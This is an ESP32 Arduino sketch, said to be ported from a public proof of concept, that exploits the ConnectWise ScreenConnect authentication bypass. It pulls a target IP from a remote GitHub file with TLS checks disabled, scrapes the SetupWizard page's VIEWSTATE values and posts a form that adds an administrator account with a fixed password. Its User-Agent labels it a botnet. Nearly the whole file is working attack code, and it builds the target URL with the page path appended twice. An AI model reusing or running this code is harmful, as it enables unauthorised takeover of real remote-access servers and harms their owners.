//Exploit code entirely lifted/ported from https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/tree/main
#include <WiFi.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>

const char* ssid = "YOUR_SSID";
const char* password = "YOUR_WIFI_PASSWORD";

const char* username = "hellothere";
const char* userPassword = "admin123!";
String targetUrl;

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);

  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }

  Serial.println("Connected to WiFi");
  fetchTargetUrl();
  addNewUser(targetUrl.c_str(), username, userPassword);
}

void loop() {
  // Nothing to do here.
}

void fetchTargetUrl() {
  WiFiClientSecure client;
  HTTPClient http;
  client.setInsecure(); // Disable SSL certificate verification
  http.begin(client, "https://raw.githubusercontent.com/lozaning/CTooth.Cloud/main/targets.json");
  int httpCode = http.GET();
  
  if (httpCode == 200) {
    String payload = http.getString();
    // Simple extraction assuming the JSON format is known and consistent: [ip:192.168.1.120]
    int startIndex = payload.indexOf('[') + 4; // Skip '[ip:'
    int endIndex = payload.indexOf(']', startIndex);
    String ip = payload.substring(startIndex, endIndex);
    targetUrl = "http://" + ip + "/SetupWizard.aspx/";
    Serial.println("Target URL: " + targetUrl);
  } else {
    Serial.println("Failed to fetch target URL");
  }
  http.end();
}

void addNewUser(const char* url, const char* username, const char* password) {
  HTTPClient http;
  String fullUrl = String(url) + "SetupWizard.aspx/";
  String responseData;
  
  // Initial GET request with custom User-Agent
  http.begin(fullUrl.c_str());
  http.addHeader("User-Agent", "Planck Mini Toothbrush BotNet");
  http.setFollowRedirects(HTTPC_FORCE_FOLLOW_REDIRECTS);
  int httpCode = http.GET();
  
  if (httpCode > 0) {
    responseData = http.getString();
    String viewstate = extractValue(responseData, "value=\"", "\"");
    String viewgen = extractValue(responseData, "VIEWSTATEGENERATOR\" value=\"", "\"");

    String postData = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=" + viewstate + "&__VIEWSTATEGENERATOR=" + viewgen + "&ctl00$Main$wizard$userNameBox=" + username + "&ctl00$Main$wizard$emailBox=" + username + "@poc.com" + "&ctl00$Main$wizard$passwordBox=" + password + "&ctl00$Main$wizard$verifyPasswordBox=" + password + "&ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton=Next";
    
    http.begin(fullUrl.c_str());
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");
    httpCode = http.POST(postData);

    if (httpCode > 0) {
      responseData = http.getString();
      Serial.println("Successfully added user");
    } else {
      Serial.println("Failed to add user");
    }
  } else {
    Serial.println("Initial GET request failed");
  }

  http.end();
}

String extractValue(String data, String startDelimiter, String endDelimiter) {
  int startIndex = data.indexOf(startDelimiter);
  if (startIndex == -1) {
    return "";
  }
  startIndex += startDelimiter.length();
  int endIndex = data.indexOf(endDelimiter, startIndex);
  if (endIndex == -1) {
    return "";
  }
  return data.substring(startIndex, endIndex);
}

